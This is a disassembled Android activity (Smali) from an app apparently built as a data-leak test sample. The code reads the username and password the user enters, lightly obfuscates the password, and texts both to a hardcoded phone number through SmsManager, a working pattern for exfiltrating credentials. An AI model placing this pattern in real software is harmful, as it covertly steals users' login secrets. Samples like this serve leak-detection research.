.class public Lcom/example/sampr/leakageapp/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# instance fields
.field private user:Lcom/example/sampr/leakageapp/User;


# direct methods
.method public constructor <init>()V
    .registers 2

    .prologue
    .line 13
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 14
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/example/sampr/leakageapp/MainActivity;->user:Lcom/example/sampr/leakageapp/User;

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .registers 3
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 17
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 18
    const v0, 0x7f04001a

    invoke-virtual {p0, v0}, Lcom/example/sampr/leakageapp/MainActivity;->setContentView(I)V

    .line 19
    return-void
.end method

.method protected onRestart()V
    .registers 7

    .prologue
    .line 22
    invoke-super {p0}, Landroid/app/Activity;->onRestart()V

    .line 23
    const v5, 0x7f0b0056

    .line 24
    invoke-virtual {p0, v5}, Lcom/example/sampr/leakageapp/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/widget/EditText;

    .line 25
    .local v4, "usernameText":Landroid/widget/EditText;
    const v5, 0x7f0b0055

    .line 26
    invoke-virtual {p0, v5}, Lcom/example/sampr/leakageapp/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    .line 27
    .local v0, "passwordText":Landroid/widget/EditText;
    invoke-virtual {v4}, Landroid/widget/EditText;->toString()Ljava/lang/String;

    move-result-object v3

    .line 28
    .local v3, "uname":Ljava/lang/String;
    invoke-virtual {v0}, Landroid/widget/EditText;->toString()Ljava/lang/String;

    move-result-object v1

    .line 29
    .local v1, "pwd":Ljava/lang/String;
    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v5

    if-nez v5, :cond_30

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v5

    if-nez v5, :cond_30

    .line 30
    new-instance v5, Lcom/example/sampr/leakageapp/User;

    invoke-direct {v5, v3, v1}, Lcom/example/sampr/leakageapp/User;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    iput-object v5, p0, Lcom/example/sampr/leakageapp/MainActivity;->user:Lcom/example/sampr/leakageapp/User;

    .line 32
    :cond_30
    const v5, 0x7f0b0057

    invoke-virtual {p0, v5}, Lcom/example/sampr/leakageapp/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/Button;

    .line 33
    .local v2, "sampritysButton":Landroid/widget/Button;
    new-instance v5, Lcom/example/sampr/leakageapp/MainActivity$1;

    invoke-direct {v5, p0}, Lcom/example/sampr/leakageapp/MainActivity$1;-><init>(Lcom/example/sampr/leakageapp/MainActivity;)V

    invoke-virtual {v2, v5}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 40
    return-void
.end method

.method public sendMessage(Landroid/view/View;)V
    .registers 13
    .param p1, "view"    # Landroid/view/View;

    .prologue
    const/4 v2, 0x0

    .line 43
    iget-object v1, p0, Lcom/example/sampr/leakageapp/MainActivity;->user:Lcom/example/sampr/leakageapp/User;

    if-nez v1, :cond_6

    .line 54
    :goto_5
    return-void

    .line 44
    :cond_6
    iget-object v1, p0, Lcom/example/sampr/leakageapp/MainActivity;->user:Lcom/example/sampr/leakageapp/User;

    invoke-virtual {v1}, Lcom/example/sampr/leakageapp/User;->getPwd()Ljava/lang/String;

    move-result-object v8

    .line 45
    .local v8, "pwdString":Ljava/lang/String;
    const-string v7, ""

    .line 47
    .local v7, "obfPwd":Ljava/lang/String;
    invoke-virtual {v8}, Ljava/lang/String;->toCharArray()[C

    move-result-object v4

    array-length v5, v4

    const/4 v1, 0x0

    :goto_14
    if-ge v1, v5, :cond_32

    aget-char v6, v4, v1

    .line 48
    .local v6, "c":C
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v6}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "_"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    .line 47
    add-int/lit8 v1, v1, 0x1

    goto :goto_14

    .line 49
    .end local v6    # "c":C
    :cond_32
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "User: "

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v4, p0, Lcom/example/sampr/leakageapp/MainActivity;->user:Lcom/example/sampr/leakageapp/User;

    .line 50
    invoke-virtual {v4}, Lcom/example/sampr/leakageapp/User;->getUname()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v4, " | PWD: "

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 51
    .local v3, "message":Ljava/lang/String;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 52
    .local v0, "sms":Landroid/telephony/SmsManager;
    const-string v1, "+44 020 7321 0905"

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    goto :goto_5
.end method
